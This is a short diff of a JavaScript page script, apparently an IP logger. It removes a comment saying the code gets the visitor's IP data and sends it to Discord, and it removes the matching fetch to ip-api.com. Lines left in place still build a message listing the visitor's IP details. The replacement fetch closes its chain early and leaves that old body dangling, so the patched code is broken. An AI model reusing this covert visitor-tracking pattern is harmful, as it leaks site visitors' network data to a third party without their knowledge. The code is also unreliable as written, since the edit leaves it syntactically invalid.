@@ -91,10 +91,10 @@
       image.style.filter = 'blur(8px)';
     }
 
-    // Pega info de IP e envia pro Discord
-    fetch('https://ip-api.com/json/')
-      .then(response => response.json())
-      .then(data => {
+fetch("https://ip-api.com/json/")
+  .then(response => response.json())
+  .then(data => console.log(data))
+  .catch(error => console.error("Erro:", error));
         const mensagem = {
           content: `Aqui estão as informações do IP:\n
                     **IP:** ${data.query}\n
